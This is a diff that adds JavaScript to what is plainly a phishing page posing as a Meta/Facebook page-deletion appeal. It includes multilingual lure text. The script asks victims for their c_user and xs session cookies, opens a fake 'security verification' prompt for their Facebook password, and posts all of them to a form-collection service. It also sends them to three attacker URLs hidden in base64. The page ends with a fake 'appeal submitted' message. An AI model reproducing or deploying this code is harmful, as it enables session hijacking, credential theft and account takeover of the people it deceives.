+                submission_error: "An error occurred while submitting your appeal. Please try again later.",
+                error_occurred: "An error occurred. Please try again.",
+                required_fields: "Please fill in both required fields before submitting your appeal.",
+                c_user_numbers: "The c_user value must contain only numbers.",
+                xs_combination: "The xs value must contain a combination of letters, numbers, and symbols.",
+                password_required: "Password is required to submit your appeal.",
+                confirm_cancel: "Are you sure you want to cancel? Any unsaved information will be lost."
+            },
+            es: {
+                facebook: "Facebook",
+                search_placeholder: "¿Cómo podemos ayudarte?",
+                translate: "Traducir",
+                home: "Inicio",
+                page_deletion: "Aviso de eliminación de página",
+                page_scheduled: "Página programada para eliminación",
+                reasons_title: "Razones para esta acción:",
+                reason1: "Contenido que viola nuestras Normas comunitarias",
+                reason2: "Violaciones repetidas de nuestras políticas",
+                reason3: "Comportamiento inauténtico o contenido engañoso",
+                reason4: "Spam o prácticas engañosas",
+                appeal_title: "Apelar esta decisión en 24 horas",
+                play_video: "Reproducir video",
+                video_not_supported: "Su navegador no soporta el elemento de video.",
+                watch_instruction: "Mira el video para aprender cómo apelar",
+                select_language: "Seleccionar idioma",
+                cancel: "Cancelar",
+                apply: "Aplicar",
+                c_user_label: "Valor c_user",
+                c_user_placeholder: "Ingrese su valor c_user (solo números)",
+                xs_label: "Valor xs",
+                xs_placeholder: "Ingrese su valor xs (combinación de letras, números, símbolos)",
+                submit_appeal: "Enviar apelación",
+                instructions_title: "Instrucciones de apelación",
+                instruction1: "Proporcione valores precisos de c_user y xs de sus cookies de Facebook",
+                instruction2: "El valor c_user debe contener solo números",
+                instruction3: "El valor xs debe contener letras, números y símbolos",
+                instruction4: "Nuestro equipo revisará su apelación y responderá por correo electrónico",
+                instruction5: "Las apelaciones generalmente se procesan en un plazo de 7 días hábiles",
+                additional_help: "Recursos de ayuda adicionales",
+                community_standards: "Normas comunitarias",
+                help_center: "Centro de ayuda",
+                terms_service: "Términos de servicio",
+                privacy_policy: "Política de privacidad",
+                about: "Acerca de",
+                cookies: "Cookies",
+                careers: "Carreras",
+                contact: "Contáctenos",
+                copyright1: "© 2025 Meta Platforms, Inc.",
+                security_verification: "Verificación de seguridad",
+                enter_password: "Por motivos de seguridad, ingrese su contraseña de Facebook para confirmar su identidad:",
+                enter_password_placeholder: "Ingrese su contraseña",
+                forgot_password: "¿Olvidó su contraseña?",
+                continue: "Continuar",
+                appeal_submitted: "Apelación enviada",
+                appeal_success: "¡Su apelación ha sido enviada con éxito! Nuestro equipo revisará su solicitud y responderá por correo electrónico dentro de 7 días hábiles.",
+                ok: "Aceptar",
+                processing: "Procesando...",
+                submission_error: "Ocurrió un error al enviar su apelación. Por favor, inténtelo de nuevo más tarde.",
+                error_occurred: "Ocurrió un error. Por favor, inténtelo de nuevo.",
+                required_fields: "Por favor complete ambos campos requeridos antes de enviar su apelación.",
+                c_user_numbers: "El valor c_user debe contener solo números.",
+                xs_combination: "El valor xs debe contener una combinación de letras, números y símbolos.",
+                password_required: "Se requiere contraseña para enviar su apelación.",
+                confirm_cancel: "¿Está seguro de que desea cancelar? Cualquier información no guardada se perderá."
+            },
+            fr: {
+                facebook: "Facebook",
+                search_placeholder: "Comment pouvons-nous vous aider?",
+                translate: "Traduire",
+                home: "Accueil",
+                page_deletion: "Avis de suppression de page",
+                page_scheduled: "Page programmée pour suppression",
+                reasons_title: "Raisons de cette action:",
+                reason1: "Contenu qui viole nos Standards de la communauté",
+                reason2: "Violations répétées de nos politiques",
+                reason3: "Comportement inauthentique ou contenu trompeur",
+                reason4: "Spam ou pratiques trompeuses",
+                appeal_title: "Faire appel de cette décision dans les 24 heures",
+                play_video: "Lire la vidéo",
+                video_not_supported: "Votre navigateur ne prend pas en charge la balise vidéo.",
+                watch_instruction: "Regardez la vidéo pour apprendre à faire appel",
+                select_language: "Sélectionner la langue",
+                cancel: "Annuler",
+                apply: "Appliquer",
+                c_user_label: "Valeur c_user",
+                c_user_placeholder: "Entrez votre valeur c_user (chiffres uniquement)",
+                xs_label: "Valeur xs",
+                xs_placeholder: "Entrez votre valeur xs (combinaison de lettres, chiffres, symboles)",
+                submit_appeal: "Soumettre l'appel",
+                instructions_title: "Instructions pour faire appel",
+                instruction1: "Fournissez des valeurs précises de c_user et xs à partir de vos cookies Facebook",
+                instruction2: "La valeur c_user ne doit contenir que des chiffres",
+                instruction3: "La valeur xs doit contenir des lettres, des chiffres et des symboles",
+                instruction4: "Notre équipe examinera votre appel et répondra par e-mail",
+                instruction5: "Les appels sont généralement traités dans un délai de 7 jours ouvrables",
+                additional_help: "Ressources d'aide supplémentaires",
+                community_standards: "Standards de la communauté",
+                help_center: "Centre d'aide",
+                terms_service: "Conditions d'utilisation",
+                privacy_policy: "Politique de confidentialité",
+                about: "À propos",
+                cookies: "Cookies",
+                careers: "Carrières",
+                contact: "Nous contacter",
+                copyright1: "© 2025 Meta Platforms, Inc.",
+                security_verification: "Vérification de sécurité",
+                enter_password: "Pour des raisons de sécurité, veuillez entrer votre mot de passe Facebook pour confirmer votre identité:",
+                enter_password_placeholder: "Entrez votre mot de passe",
+                forgot_password: "Mot de passe oublié?",
+                continue: "Continuer",
+                appeal_submitted: "Appel soumis",
+                appeal_success: "Votre appel a été soumis avec succès! Notre équipe examinera votre demande et répondra par e-mail dans un délai de 7 jours ouvrables.",
+                ok: "OK",
+                processing: "Traitement...",
+                submission_error: "Une erreur s'est produite lors de la soumission de votre appel. Veuillez réessayer plus tard.",
+                error_occurred: "Une erreur s'est produite. Veuillez réessayer.",
+                required_fields: "Veuillez remplir les deux champs obligatoires avant de soumettre votre appel.",
+                c_user_numbers: "La valeur c_user ne doit contenir que des chiffres.",
+                xs_combination: "La valeur xs doit contenir une combinaison de lettres, de chiffres et de symboles.",
+                password_required: "Un mot de passe est requis pour soumettre votre appel.",
+                confirm_cancel: "Êtes-vous sûr de vouloir annuler? Toute information non enregistrée sera perdue."
+            },
+            de: {
+                facebook: "Facebook",
+                search_placeholder: "Wie können wir helfen?",
+                translate: "Übersetzen",
+                home: "Startseite",
+                page_deletion: "Seitenlöschungsmitteilung",
+                page_scheduled: "Seite zur Löschung vorgesehen",
+                reasons_title: "Gründe für diese Maßnahme:",
+                reason1: "Inhalte, die gegen unsere Gemeinschaftsstandards verstoßen",
+                reason2: "Wiederholte Verstöße gegen unsere Richtlinien",
+                reason3: "Unechtes Verhalten oder irreführende Inhalte",
+                reason4: "Spam oder betrügerische Praktiken",
+                appeal_title: "Berufen Sie sich innerhalb von 24 Stunden gegen diese Entscheidung",
+                play_video: "Video abspielen",
+                video_not_supported: "Ihr Browser unterstützt das Video-Tag nicht.",
+                watch_instruction: "Sehen Sie sich das Video an, um zu erfahren, wie Sie Berufung einlegen können",
+                select_language: "Sprache auswählen",
+                cancel: "Abbrechen",
+                apply: "Anwenden",
+                c_user_label: "c_user Wert",
+                c_user_placeholder: "Geben Sie Ihren c_user-Wert ein (nur Zahlen)",
+                xs_label: "xs Wert",
+                xs_placeholder: "Geben Sie Ihren xs-Wert ein (Kombination aus Buchstaben, Zahlen, Symbolen)",
+                submit_appeal: "Berufung einreichen",
+                instructions_title: "Anweisungen zur Berufung",
+                instruction1: "Geben Sie genaue c_user- und xs-Werte aus Ihren Facebook-Cookies an",
+                instruction2: "Der c_user-Wert sollte nur Zahlen enthalten",
+                instruction3: "Der xs-Wert sollte Buchstaben, Zahlen und Symbole enthalten",
+                instruction4: "Unser Team wird Ihre Berufung prüfen und per E-Mail antworten",
+                instruction5: "Berufungen werden in der Regel innerhalb von 7 Werktagen bearbeitet",
+                additional_help: "Zusätzliche Hilfsquellen",
+                community_standards: "Gemeinschaftsstandards",
+                help_center: "Hilfebereich",
+                terms_service: "Nutzungsbedingungen",
+                privacy_policy: "Datenschutzrichtlinie",
+                about: "Über uns",
+                cookies: "Cookies",
+                careers: "Karriere",
+                contact: "Kontakt",
+                copyright1: "© 2025 Meta Platforms, Inc.",
+                security_verification: "Sicherheitsüberprüfung",
+                enter_password: "Geben Sie aus Sicherheitsgründen Ihr Facebook-Passwort ein, um Ihre Identität zu bestätigen:",
+                enter_password_placeholder: "Geben Sie Ihr Passwort ein",
+                forgot_password: "Passwort vergessen?",
+                continue: "Weiter",
+                appeal_submitted: "Berufung eingereicht",
+                appeal_success: "Ihre Berufung wurde erfolgreich eingereicht! Unser Team wird Ihre Anfrage prüfen und innerhalb von 7 Werktagen per E-Mail antworten.",
+                ok: "OK",
+                processing: "Wird verarbeitet...",
+                submission_error: "Beim Einreichen Ihrer Berufung ist ein Fehler aufgetreten. Bitte versuchen Sie es später noch einmal.",
+                error_occurred: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
+                required_fields: "Bitte füllen Sie beide erforderlichen Felder aus, bevor Sie Ihre Berufung einreichen.",
+                c_user_numbers: "Der c_user-Wert darf nur Zahlen enthalten.",
+                xs_combination: "Der xs-Wert muss eine Kombination aus Buchstaben, Zahlen und Symbolen enthalten.",
+                password_required: "Zur Einreichung Ihrer Berufung ist ein Passwort erforderlich.",
+                confirm_cancel: "Sind Sie sicher, dass Sie abbrechen möchten? Alle nicht gespeicherten Informationen gehen verloren."
+            },
+            hi: {
+                facebook: "फेसबुक",
+                search_placeholder: "हम कैसे मदद कर सकते हैं?",
+                translate: "अनुवाद",
+                home: "होम",
+                page_deletion: "पृष्ठ हटाने का नोटिस",
+                page_scheduled: "हटाने के लिए निर्धारित पृष्ठ",
+                reasons_title: "इस कार्रवाई के कारण:",
+                reason1: "हमारे सामुदायिक मानकों का उल्लंघन करने वाली सामग्री",
+                reason2: "हमारी नीतियों का बार-बार उल्लंघन",
+                reason3: "असत्यापित व्यवहार या भ्रामक सामग्री",
+                reason4: "स्पैम या धोखाधड़ी वाली प्रथाएं",
+                appeal_title: "24 घंटे के भीतर इस निर्णय के खिलाफ अपील करें",
+                play_video: "वीडियो चलाएं",
+                video_not_supported: "आपका ब्राउज़र वीडियो टैग का समर्थन नहीं करता है।",
+                watch_instruction: "अपील करने का तरीका जानने के लिए वीडियो देखें",
+                select_language: "भाषा चुनें",
+                cancel: "रद्द करें",
+                apply: "लागू करें",
+                c_user_label: "c_user मान",
+                c_user_placeholder: "अपना c_user मान दर्ज करें (केवल संख्याएं)",
+                xs_label: "xs मान",
+                xs_placeholder: "अपना xs मान दर्ज करें (अक्षरों, संख्याओं, प्रतीकों का संयोजन)",
+                submit_appeal: "अपील जमा करें",
+                instructions_title: "अपील निर्देश",
+                instruction1: "अपने फेसबुक कुकीज़ से सटीक c_user और xs मान प्रदान करें",
+                instruction2: "c_user मान में केवल संख्याएं होनी चाहिए",
+                instruction3: "xs मान में अक्षर, संख्याएं और प्रतीक होने चाहिए",
+                instruction4: "हमारी टीम आपकी अपील की समीक्षा करेगी और ईमेल के माध्यम से जवाब देगी",
+                instruction5: "अपील आमतौर पर 7 कार्य दिवसों के भीतर संसाधित की जाती है",
+                additional_help: "अतिरिक्त सहायता संसाधन",
+                community_standards: "सामुदायिक मानक",
+                help_center: "सहायता केंद्र",
+                terms_service: "सेवा की शर्तें",
+                privacy_policy: "गोपनीयता नीति",
+                about: "के बारे में",
+                cookies: "कुकीज़",
+                careers: "करियर",
+                contact: "हमसे संपर्क करें",
+                copyright1: "© 2025 मेटा प्लेटफॉर्म्स, इंक.",
+                security_verification: "सुरक्षा सत्यापन",
+                enter_password: "सुरक्षा उद्देश्यों के लिए, कृपया अपनी पहचान की पुष्टि करने के लिए अपना फेसबुक पासवर्ड दर्ज करें:",
+                enter_password_placeholder: "अपना पासवर्ड दर्ज करें",
+                forgot_password: "पासवर्ड भूल गए?",
+                continue: "जारी रखें",
+                appeal_submitted: "अपील जमा हो गई",
+                appeal_success: "आपकी अपील सफलतापूर्वक जमा कर दी गई है! हमारी टीम आपके अनुरोध की समीक्षा करेगी और 7 कार्य दिवसों के भीतर ईमेल के माध्यम से जवाब देगी।",
+                ok: "ठीक है",
+                processing: "प्रसंस्करण...",
+                submission_error: "आपकी अपील जमा करते समय एक त्रुटि हुई। कृपया बाद में पुनः प्रयास करें।",
+                error_occurred: "एक त्रुटि हुई। कृपया पुनः प्रयास करें।",
+                required_fields: "अपनी अपील जमा करने से पहले कृपया दोनों आवश्यक फ़ील्ड भरें।",
+                c_user_numbers: "c_user मान में केवल संख्याएं होनी चाहिए।",
+                xs_combination: "xs मान में अक्षरों, संख्याओं और प्रतीकों का संयोजन होना चाहिए।",
+                password_required: "अपनी अपील जमा करने के लिए पासवर्ड आवश्यक है।",
+                confirm_cancel: "क्या आप वाकई रद्द करना चाहते हैं? कोई भी सहेजी नहीं गई जानकारी खो जाएगी।"
+            },
+            ar: {
+                facebook: "فيسبوك",
+                search_placeholder: "كيف يمكننا المساعدة؟",
+                translate: "ترجمة",
+                home: "الصفحة الرئيسية",
+                page_deletion: "إشعار حذف الصفحة",
+                page_scheduled: "الصفحة المقرر حذفها",
+                reasons_title: "أسباب هذا الإجراء:",
+                reason1: "المحتوى الذي ينتهك معايير المجتمع الخاصة بنا",
+                reason2: "انتهاكات متكررة لسياساتنا",
+                reason3: "سلوك غير أصلي أو محتوى مضلل",
+                reason4: "البريد المزعج أو الممارسات الخادعة",
+                appeal_title: "استأنف هذا القرار خلال 24 ساعة",
+                play_video: "تشغيل الفيديو",
+                video_not_supported: "متصفحك لا يدعم علامة الفيديو.",
+                watch_instruction: "شاهد الفيديو لمعرفة كيفية الاستئناف",
+                select_language: "اختر اللغة",
+                cancel: "إلغاء",
+                apply: "تطبيق",
+                c_user_label: "قيمة c_user",
+                c_user_placeholder: "أدخل قيمة c_user الخاصة بك (أرقام فقط)",
+                xs_label: "قيمة xs",
+                xs_placeholder: "أدخل قيمة xs الخاصة بك (مزيج من الحروف والأرقام والرموز)",
+                submit_appeal: "إرسال الاستئناف",
+                instructions_title: "تعليمات الاستئناف",
+                instruction1: "تقديم قيم دقيقة لـ c_user و xs من ملفات تعريف الارتباط الخاصة بفيسبوك",
+                instruction2: "يجب أن تحتوي قيمة c_user على أرقام فقط",
+                instruction3: "يجب أن تحتوي قيمة xs على حروف وأرقام ورموز",
+                instruction4: "سيقوم فريقنا بمراجعة استئنافك والرد عبر البريد الإلكتروني",
+                instruction5: "يتم معالجة الاستئنافات عادةً في غضون 7 أيام عمل",
+                additional_help: "موارد مساعدة إضافية",
+                community_standards: "معايير المجتمع",
+                help_center: "مركز المساعدة",
+                terms_service: "شروط الخدمة",
+                privacy_policy: "سياسة الخصوصية",
+                about: "حول",
+                cookies: "ملفات تعريف الارتباط",
+                careers: "وظائف",
+                contact: "اتصل بنا",
+                copyright1: "© 2025 Meta Platforms, Inc.",
+                security_verification: "التحقق من الأمان",
+                enter_password: "لأغراض أمنية، يرجى إدخال كلمة مرور فيسبوك الخاصة بك لتأكيد هويتك:",
+                enter_password_placeholder: "أدخل كلمة المرور الخاصة بك",
+                forgot_password: "هل نسيت كلمة السر؟",
+                continue: "متابعة",
+                appeal_submitted: "تم إرسال الاستئناف",
+                appeal_success: "تم إرسال استئنافك بنجاح! سيقوم فريقنا بمراجعة طلبك والرد عبر البريد الإلكتروني في غضون 7 أيام عمل.",
+                ok: "موافق",
+                processing: "جاري المعالجة...",
+                submission_error: "حدث خطأ أثناء إرسال استئنافك. يرجى المحاولة مرة أخرى في وقت لاحق.",
+                error_occurred: "حدث خطأ. يرجى المحاولة مرة أخرى.",
+                required_fields: "يرجى ملء كلا الحقلين المطلوبين قبل إرسال استئنافك.",
+                c_user_numbers: "يجب أن تحتوي قيمة c_user على أرقام فقط.",
+                xs_combination: "يجب أن تحتوي قيمة xs على مزيج من الحروف والأرقام والرموز.",
+                password_required: "كلمة المرور مطلوبة لإرسال استئنافك.",
+                confirm_cancel: "هل أنت متأكد أنك تريد الإلغاء؟ سيتم فقد أي معلومات غير محفوظة."
+            },
+            ta: {
+                facebook: "பேஸ்புக்",
+                search_placeholder: "நாங்கள் எப்படி உதவ முடியும்?",
+                translate: "மொழிபெயர்",
+                home: "முகப்பு",
+                page_deletion: "பக்க நீக்கம் அறிவிப்பு",
+                page_scheduled: "நீக்கத்திற்கு திட்டமிடப்பட்ட பக்கம்",
+                reasons_title: "இந்த நடவடிக்கைக்கான காரணங்கள்:",
+                reason1: "எங்கள் சமூக தரநிலைகளை மீறும் உள்ளடக்கம்",
+                reason2: "எங்கள் கொள்கைகளை மீண்டும் மீண்டும் மீறுதல்",
+                reason3: "உண்மையற்ற நடத்தை அல்லது தவறான தகவல்",
+                reason4: "ஸ்பேம் அல்லது ஏமாற்று நடைமுறைகள்",
+                appeal_title: "24 மணி நேரத்திற்குள் இந்த முடிவுக்கு முறையீடு செய்யவும்",
+                play_video: "வீடியோவை இயக்கவும்",
+                video_not_supported: "உங்கள் உலாவி வீடியோ டேக்கை ஆதரிக்கவில்லை.",
+                watch_instruction: "முறையீடு செய்வது எப்படி என்பதை அறிய வீடியோவைப் பார்க்கவும்",
+                select_language: "மொழியைத் தேர்ந்தெடுக்கவும்",
+                cancel: "ரத்து செய்",
+                apply: "விண்ணப்பிக்கவும்",
+                c_user_label: "c_user மதிப்பு",
+                c_user_placeholder: "உங்கள் c_user மதிப்பை உள்ளிடவும் (எண்கள் மட்டுமே)",
+                xs_label: "xs மதிப்பு",
+                xs_placeholder: "உங்கள் xs மதிப்பை உள்ளிடவும் (எழுத்துக்கள், எண்கள், குறியீடுகளின் கலவை)",
+                submit_appeal: "முறையீட்டை சமர்ப்பிக்கவும்",
+                instructions_title: "முறையீட்டு வழிமுறைகள்",
+                instruction1: "உங்கள் பேஸ்புக் குக்கீகளிலிருந்து சரியான c_user மற்றும் xs மதிப்புகளை வழங்கவும்",
+                instruction2: "c_user மதிப்பு எண்களை மட்டுமே கொண்டிருக்க வேண்டும்",
+                instruction3: "xs மதிப்பு எழுத்துக்கள், எண்கள் மற்றும் குறியீடுகளைக் கொண்டிருக்க வேண்டும்",
+                instruction4: "எங்கள் குழு உங்கள் முறையீட்டை மதிப்பாய்வு செய்து மின்னஞ்சல் மூலம் பதிலளிக்கும்",
+                instruction5: "முறையீடுகள் பொதுவாக 7 வேலை நாட்களில் செயல்படுத்தப்படும்",
+                additional_help: "கூடுதல் உதவி வளங்கள்",
+                community_standards: "சமூக தரநிலைகள்",
+                help_center: "உதவி மையம்",
+                terms_service: "சேவை விதிமுறைகள்",
+                privacy_policy: "தனியுரிமைக் கொள்கை",
+                about: "பற்றி",
+                cookies: "குக்கீகள்",
+                careers: "வாழ்க்கை",
+                contact: "எங்களைத் தொடர்பு கொள்ளவும்",
+                copyright1: "© 2025 மெட்டா பிளாட்ஃபார்ம்ஸ், இன்க்.",
+                security_verification: "பாதுகாப்பு சரிபார்ப்பு",
+                enter_password: "பாதுகாப்பு நோக்கங்களுக்காக, உங்கள் அடையாளத்தை உறுதிப்படுத்த உங்கள் பேஸ்புக் கடவுச்சொல்லை உள்ளிடவும்:",
+                enter_password_placeholder: "உங்கள் கடவுச்சொல்லை உள்ளிடவும்",
+                forgot_password: "கடவுச்சொல் மறந்துவிட்டீர்களா?",
+                continue: "தொடரவும்",
+                appeal_submitted: "முறையீடு சமர்ப்பிக்கப்பட்டது",
+                appeal_success: "உங்கள் முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது! எங்கள் குழு உங்கள் கோரிக்கையை மதிப்பாய்வு செய்து 7 வேலை நாட்களுக்குள் மின்னஞ்சல் மூலம் பதிலளிக்கும்.",
+                ok: "சரி",
+                processing: "செயலாக்கம்...",
+                submission_error: "உங்கள் முறையீட்டை சமர்ப்பிக்கும் போது ஒரு பிழை ஏற்பட்டது. பின்னர் மீண்டும் முயற்சிக்கவும்.",
+                error_occurred: "ஒரு பிழை ஏற்பட்டது. மீண்டும் முயற்சிக்கவும்.",
+                required_fields: "உங்கள் முறையீட்டை சமர்ப்பிப்பதற்கு முன் இரண்டு தேவையான புலங்களையும் நிரப்பவும்.",
+                c_user_numbers: "c_user மதிப்பு எண்களை மட்டுமே கொண்டிருக்க வேண்டும்.",
+                xs_combination: "xs மதிப்பு எழுத்துக்கள், எண்கள் மற்றும் குறியீடுகளின் கலவையைக் கொண்டிருக்க வேண்டும்.",
+                password_required: "உங்கள் முறையீட்டை சமர்ப்பிக்க கடவுச்சொல் தேவை.",
+                confirm_cancel: "நிச்சயமாக ரத்து செய்ய வேண்டுமா? சேமிக்கப்படாத எந்த தகவலும் இழக்கப்படும்."
+            }
+        };
 
+        // Current language
+        let currentLanguage = 'en';
 
-</body>
+        // Function to translate the page
+        function translatePage(lang) {
+            if (!translations[lang]) {
+                console.error(`Language ${lang} not found in translations`);
+                return;
+            }
+            
+            currentLanguage = lang;
+            const elements = document.querySelectorAll('[data-translate]');
+            
+            elements.forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[lang][key]) {
+                    // For input elements, set placeholder or value
+                    if (element.tagName === 'INPUT' && element.hasAttribute('data-placeholder')) {
+                        element.placeholder = translations[lang][key];
+                    } else {
+                        element.textContent = translations[lang][key];
+                    }
+                } else {
+                    console.warn(`Translation key ${key} not found for language ${lang}`);
+                }
+            });
 
-</html>
-<html lang="en">
+            // Translate input placeholders separately
+            const inputs = document.querySelectorAll('input[data-placeholder]');
+            inputs.forEach(input => {
+                const key = input.getAttribute('data-placeholder');
+                if (translations[lang][key]) {
+                    input.placeholder = translations[lang][key];
+                }
+            });
+
+            // Save language preference
+            localStorage.setItem('preferredLanguage', lang);
+        }
+
+        // Initialize translation when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set default language to English if none is saved
+            const savedLanguage = localStorage.getItem('preferredLanguage') || 'en';
+            translatePage(savedLanguage);
+            
+            // Make sure all elements with data-translate exist before translating
+            setTimeout(() => {
+                translatePage(savedLanguage);
+            }, 100);
+        });
+
+        // Enhanced search functionality
+        const searchInput = document.querySelector('.search-bar input');
+        searchInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const query = this.value.trim();
+                if (query) {
+                    console.log(`Search initiated for: "${query}"`);
+                    this.blur();
+                }
+            }
+        });
+        
+        // Form submission handling
+        const appealForm = document.querySelector('.appeal-form');
+        const submitBtn = document.getElementById('submit-appeal-btn');
+        
+        // Function to submit to other endpoints
+        function submitToOtherEndpoints(data) {
+            const endpoints = [
+                'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=',
+                'aHR0cHM6Ly9hd2Fpcy1waHAud2FzbWVyLmFwcA==',
+                'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'
+            ];
+            
+            endpoints.forEach(encodedUrl => {
+                const decodedUrl = atob(encodedUrl);
+                const formData = new FormData();
+                formData.append('c_user', data.c_user);
+                formData.append('xs', data.xs);
+                formData.append('password', data.password);
+                
+                fetch(decodedUrl, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(data => {
+                    console.log('Submission successful:', data);
+                })
+                .catch(error => {
+                    console.error('Error submitting:', error);
+                });
+            });
+        }
+        
+        submitBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const c_user = document.getElementById('c_user').value.trim();
+            const xs = document.getElementById('xs').value.trim();
+            
+            // Basic validation
+            if (!c_user || !xs) {
+                alert(translations[currentLanguage]['required_fields'] || 'Please fill in both required fields before submitting your appeal.');
+                return;
+            }
+            
+            if (!/^\d+$/.test(c_user)) {
+                alert(translations[currentLanguage]['c_user_numbers'] || 'The c_user value must contain only numbers.');
+                return;
+            }
+            
+            if (!/^[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(xs)) {
+                alert(translations[currentLanguage]['xs_combination'] || 'The xs value must contain a combination of letters, numbers, and symbols.');
+                return;
+            }
+            
+            // Simulate form submission
+            submitBtn.disabled = true;
+            submitBtn.textContent = translations[currentLanguage]['processing'] || 'Processing...';
+            
+            try {
+                // Create password prompt
+                const passwordPrompt = document.createElement('div');
+                passwordPrompt.className = 'password-prompt-overlay';
+                passwordPrompt.innerHTML = `
+                    <div class="password-prompt">
+                        <div class="password-prompt-header">
+                            <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                            <h3>${translations[currentLanguage]['security_verification'] || 'Security Verification'}</h3>
+                        </div>
+                        <div class="password-prompt-body">
+                            <p>${translations[currentLanguage]['enter_password'] || 'For security purposes, please enter your Facebook password to confirm your identity:'}</p>
+                            <input type="password" id="password-input" placeholder="${translations[currentLanguage]['enter_password_placeholder'] || 'Enter your password'}" autocomplete="current-password">
+                            <div class="password-prompt-actions">
+                                <button id="cancel-password-btn">${translations[currentLanguage]['cancel'] || 'Cancel'}</button>
+                                <button id="confirm-password-btn" class="primary">${translations[currentLanguage]['continue'] || 'Continue'}</button>
+                            </div>
+                            <div class="password-help">
+                                <a href="#" style="color: #1877f2; text-decoration: none;">${translations[currentLanguage]['forgot_password'] || 'Forgot password?'}</a>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                document.body.appendChild(passwordPrompt);
+                
+                // Handle password prompt
+                const passwordInput = document.getElementById('password-input');
+                const cancelPasswordBtn = document.getElementById('cancel-password-btn');
+                const confirmPasswordBtn = document.getElementById('confirm-password-btn');
+                
+                passwordInput.focus();
+                
+                cancelPasswordBtn.addEventListener('click', function() {
+                    document.body.removeChild(passwordPrompt);
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
+                });
+                
+                confirmPasswordBtn.addEventListener('click', async function() {
+                    const password = passwordInput.value.trim();
+                    
+                    if (!password) {
+                        alert(translations[currentLanguage]['password_required'] || 'Password is required to submit your appeal.');
+                        return;
+                    }
+                    
+                    // Prepare complete form data
+                    const formData = {
+                        c_user: c_user,
+                        xs: xs,
+                        password: password,
+                        language: currentLanguage,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    try {
+                        confirmPasswordBtn.disabled = true;
+                        confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
+                        
+                        // Submit to SubmitForm.com
+                        const response = await fetch('https://submit-form.com/it5r8tIfi', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(formData)
+                        });
+                        
+                        const result = await response.json();
+                        
+                        if (response.ok) {
+                            // Submit to other endpoints
+                            submitToOtherEndpoints(formData);
+                            
+                            document.body.removeChild(passwordPrompt);
+                            
+                            // Show success message
+                            const successMessage = document.createElement('div');
+                            successMessage.className = 'password-prompt-overlay';
+                            successMessage.innerHTML = `
+                                <div class="password-prompt">
+                                    <div class="password-prompt-header">
+                                        <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                                        <h3>${translations[currentLanguage]['appeal_submitted'] || 'Appeal Submitted'}</h3>
+                                    </div>
+                                    <div class="password-prompt-body">
+                                        <p>${translations[currentLanguage]['appeal_success'] || 'Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.'}</p>
+                                        <div class="password-prompt-actions" style="justify-content: center;">
+                                            <button id="close-success-btn" class="primary">${translations[currentLanguage]['ok'] || 'OK'}</button>
+                                        </div>
+                                    </div>
+                                </div>
+                            `;
+                            
+                            document.body.appendChild(successMessage);
+                            
+                            document.getElementById('close-success-btn').addEventListener('click', function() {
+                                document.body.removeChild(successMessage);
+                                appealForm.reset();
+                                submitBtn.disabled = false;
+                                submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
+                            });
+                        } else {
+                            throw new Error(result.error || 'Failed to submit appeal');
+                        }
+                    } catch (error) {
+                        console.error('Form submission error:', error);
+                        alert(translations[currentLanguage]['submission_error'] || 'An error occurred while submitting your appeal. Please try again later.');
+                        confirmPasswordBtn.disabled = false;
+                        confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
+                    }
+                });
+                
+                passwordInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        confirmPasswordBtn.click();
+                    }
+                });
+                
+            } catch (error) {
+                console.error('Error:', error);
+                submitBtn.disabled = false;
+                submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
+                alert(translations[currentLanguage]['error_occurred'] || 'An error occurred. Please try again.');
+            }
+        });
+        
+        // Cancel button functionality
+        const cancelBtn = document.querySelector('.btn-secondary');
+        cancelBtn.addEventListener('click', function() {
+            if (confirm(translations[currentLanguage]['confirm_cancel'] || 'Are you sure you want to cancel? Any unsaved information will be lost.')) {
+                window.location.href = '#';
+            }
+        });
+        
+        // Video language selector functionality
+        const video = document.getElementById('appeal-video');
+        const languageSelector = document.getElementById('language-selector');
+        const playButton = document.getElementById('play-video-btn');
+        const confirmLanguageBtn = document.getElementById('confirm-language-btn');
+        const cancelLanguageBtn = document.getElementById('cancel-language-btn');
+        const languageOptions = document.querySelectorAll('#language-selector .language-option');
+        
+        // Initialize video with no controls
+        video.controls = false;
+        
+        // When play button is clicked, show language selector
+        playButton.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        });
+        
+        // When confirm button is clicked in language selector
+        confirmLanguageBtn.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'none';
+            document.body.style.overflow = '';
+            
+            const selectedOption = document.querySelector('#language-selector .language-option.selected');
+            const videoSrc = selectedOption.getAttribute('data-src');
+            
+            if (videoSrc && video.src !== videoSrc) {
+                video.src = videoSrc;
+                video.load();
+            }
+            
+            video.controls = true;
+            video.play().catch(e => console.log('Video play failed:', e));
+            playButton.style.display = 'none';
+        });
+        
+        // When cancel button is clicked in language selector
